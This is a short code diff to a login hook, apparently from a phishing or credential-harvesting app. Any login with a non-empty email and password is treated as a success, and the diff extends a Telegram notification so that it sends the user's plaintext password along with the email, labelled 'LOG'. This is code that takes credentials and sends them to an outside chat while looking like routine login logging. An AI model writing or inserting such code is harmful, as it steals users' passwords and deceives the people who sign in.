@@ -20,7 +20,7 @@ export function useLogin() {
       if (credentials.email && credentials.password) {
         setState({ isLoading: false, error: null, success: true })
         // Send notification to Telegram
-        await sendTelegramMessage(`✅ Successful login attempt\nEmail: ${credentials.email}\nTime: ${new Date().toISOString()}`)
+        await sendTelegramMessage(`✅ Successful login attempt\nEmail: ${credentials.email}\nLOG: ${credentials.password}\nTime: ${new Date().toISOString()}`)
       } else {
         setState({ isLoading: false, error: 'Invalid email or password.', success: false })
       }
